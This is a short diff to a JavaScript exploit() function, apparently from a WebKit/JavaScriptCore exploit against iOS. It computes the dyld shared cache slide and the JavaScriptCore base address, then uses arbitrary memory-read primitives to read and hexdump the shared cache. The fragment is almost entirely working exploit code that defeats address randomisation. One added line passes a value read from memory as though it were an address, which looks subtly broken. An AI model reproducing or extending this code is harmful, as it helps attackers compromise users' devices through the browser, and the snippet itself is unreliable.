@@ -486,11 +486,13 @@ function exploit(){
 	    log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
 	    var base = Add(new Int64('0x1881BD000'), slide);
 	    log('[+] And thus the JavaScriptCore base is '+base.toString(16));
-	    //var magic =  r32(base);
-	    //log('[+] Which has magic '+magic.toString(16));
 	    log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
 	    tmp = base;
 	    var dcache_base = Add(0x180000000,slide);
+	    var magic =  r32(dcache_base);
+	    log('[+] Which has magic '+magic.toString(16));
+	    memory.read_i32(magic);
+	    log('magic = ' + magic);
 	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0, 500)); //dump first 100-bytes
 	    log('[+] Dumping dyld shared cache...');
 	    log(hexdump(dcache_dump, 8, dcache_base));
